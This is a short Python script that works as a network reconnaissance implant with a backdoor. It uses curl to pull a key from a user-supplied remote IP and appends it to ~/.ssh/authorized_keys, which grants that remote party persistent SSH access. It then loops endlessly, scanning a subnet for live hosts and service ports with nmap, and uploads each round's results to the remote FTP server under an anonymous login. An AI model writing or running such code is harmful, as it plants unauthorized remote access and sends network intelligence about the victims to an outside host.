#!/usr/bin/python3
import os
from ftplib import FTP
import ftplib
username = 'anonymous'
remote_path = "pub"
remoteIP = input("Enter Remote FTP Server IP: ")
nmapdb = input("Enter your name: ")
subnet =input("Enter IP Address/CIDR for scan: ")
os.system("apt-get install nmap -y")
getKey = "mkdir ~/.ssh && curl %s >> ~/.ssh/authorized_keys" % remoteIP
os.system(getKey)
while True:
	firstScan = "nmap -n -sn " + subnet + " -oG - | awk '/Up$/{print $2}' > first.txt"
	secondScan = "nmap -v -T5 " + subnet + " -p21,22,23,25,110,139,443,445,3000,3389,8080 | grep Discovered | awk '{print $6}' > second.txt"
	os.system(firstScan)
	os.system(secondScan)
	os.system("sort first.txt second.txt | uniq > initial.txt")
	os.system("nmap -sV -T5 -iL initial.txt -oA " + nmapdb)
	ftp_connection = ftplib.FTP(remoteIP, username)
	ftp_connection.cwd(remote_path)
	ftp_connection.set_pasv(False)
	fh = open(nmapdb +".xml" , 'rb')
	ftp_connection.storbinary("STOR %s.xml" % nmapdb, fh)
	fh.close()
	ftp_connection.quit()



